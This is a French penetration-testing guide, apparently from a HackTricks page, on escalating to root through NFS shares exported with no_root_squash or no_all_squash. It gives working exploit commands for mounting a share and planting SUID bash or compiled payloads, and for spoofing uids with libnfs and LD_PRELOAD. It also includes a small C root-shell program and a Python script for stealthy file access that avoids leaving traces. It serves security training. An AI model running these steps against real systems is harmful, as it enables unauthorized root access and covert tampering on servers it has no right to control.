{{#include ../../banners/hacktricks-training.md}}

Lisez le fichier _ **/etc/exports** _. Si vous trouvez un répertoire configuré en **no_root_squash**, alors vous pouvez **y accéder** **en tant que client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

**no_root_squash** : Cette option donne essentiellement l'autorité à l'utilisateur root sur le client d'accéder aux fichiers sur le serveur NFS en tant que root. Cela peut entraîner de graves implications en matière de sécurité.

**no_all_squash :** Cela est similaire à l'option **no_root_squash** mais s'applique aux **utilisateurs non-root**. Imaginez que vous avez un shell en tant qu'utilisateur nobody ; vérifiez le fichier /etc/exports ; l'option no_all_squash est présente ; vérifiez le fichier /etc/passwd ; émulez un utilisateur non-root ; créez un fichier suid en tant que cet utilisateur (en montant via nfs). Exécutez le suid en tant qu'utilisateur nobody et devenez un utilisateur différent.

# Élévation de privilèges

## Exploit à distance

Si vous avez trouvé cette vulnérabilité, vous pouvez l'exploiter :

- **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté le binaire **/bin/bash** et lui donner des droits **SUID**, puis **exécuter depuis la machine victime** ce binaire bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui abusent de la permission SUID, lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version distante pour exploiter cette élévation de privilèges en tunnelant les ports requis**.\
> Le truc suivant est dans le cas où le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploitation distante** et vous devrez **abuser de ce truc**.\
> Une autre exigence requise pour que l'exploitation fonctionne est que **l'exportation à l'intérieur de `/etc/export`** **doit utiliser le drapeau `insecure`**.\
> --_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, ce truc fonctionnera_--

## Basic Information

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, tirant parti d'un défaut dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, ce qui peut permettre un accès non autorisé. L'exploitation implique l'utilisation de [libnfs](https://github.com/sahlberg/libnfs), une bibliothèque qui permet de forger des appels RPC NFS.

### Compiling the Library

Les étapes de compilation de la bibliothèque peuvent nécessiter des ajustements en fonction de la version du noyau. Dans ce cas spécifique, les appels système fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Réalisation de l'Exploitation

L'exploitation consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root et exécute ensuite un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier le uid dans les appels RPC :

1. **Compiler le code d'exploitation :**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Placer l'exploitation sur le partage et modifier ses permissions en falsifiant le uid :**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Exécuter l'exploitation pour obtenir des privilèges root :**
```bash
/mnt/share/a.out
#root
```

## Bonus : NFShell pour un Accès Furtif aux Fichiers

Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer de propriétaire (pour éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste le uid pour correspondre à celui du fichier accédé, permettant d'interagir avec les fichiers sur le partage sans problèmes de permission :
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécuter comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
